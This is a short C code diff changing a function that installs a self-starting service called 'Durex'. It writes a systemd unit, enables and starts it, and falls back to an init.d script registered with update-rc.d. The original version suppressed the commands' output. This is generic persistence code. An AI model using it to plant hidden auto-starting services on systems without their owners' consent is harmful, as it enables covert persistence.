@@ -73,13 +73,13 @@ static int init_d()
 	void *obj = NULL;
 	size_t obj_size = 0;
 
-	if ((init_fd = open(INIT_DIR, O_WRONLY | O_CREAT | O_TRUNC, 0644)) < 0)
+	if ((init_fd = open(SYSTEMD_DIR, O_WRONLY | O_CREAT | O_TRUNC, 0644)) < 0)
 	{
 		return -1;
 	}
 	// read init file content
 	// TODO use hardcoded code
-	if (read_obj(INIT_SRC, &obj, &obj_size))
+	if (read_obj(SYSTEMD_SRC, &obj, &obj_size))
 	{
 		close(init_fd);
 		return -1;
@@ -91,8 +91,33 @@ static int init_d()
 		(DEBUG) ? printf("Error munmap\n") : 0;
 	close(init_fd);
 	// reload systemd
-	system("systemctl enable Durex.service 1>/dev/null 2>/dev/null");
-	system("systemctl start  Durex.service 1>/dev/null 2>/dev/null");
+	system("systemctl enable Durex.service");// 1>/dev/null 2>/dev/null");
+	int ret = system("systemctl start Durex.service");// 1>/dev/null 2>/dev/null");
+	// if systemd not installed, switch to init d
+	if (ret)
+	{
+		if ((init_fd = open(INITD_DIR, O_WRONLY | O_CREAT | O_TRUNC, 0755)) < 0)
+		{
+			return -1;
+		}
+		// read init file content
+		// TODO use hardcoded code
+		if (read_obj(INITD_SRC, &obj, &obj_size))
+		{
+			close(init_fd);
+			return -1;
+		}
+		// write content
+		write(init_fd, obj, obj_size);
+		// tmp
+		if (munmap(obj, obj_size) < 0)
+			(DEBUG) ? printf("Error munmap\n") : 0;
+		close(init_fd);
+		// reload initd
+		system("update-rc.d Durex defaults");// 1>/dev/null 2>/dev/null");
+		system("update-rc.d Durex enable");
+		system("/etc/init.d/Durex start");// 1>/dev/null 2>/dev/null");
+	}
 	return 0;
 }
 
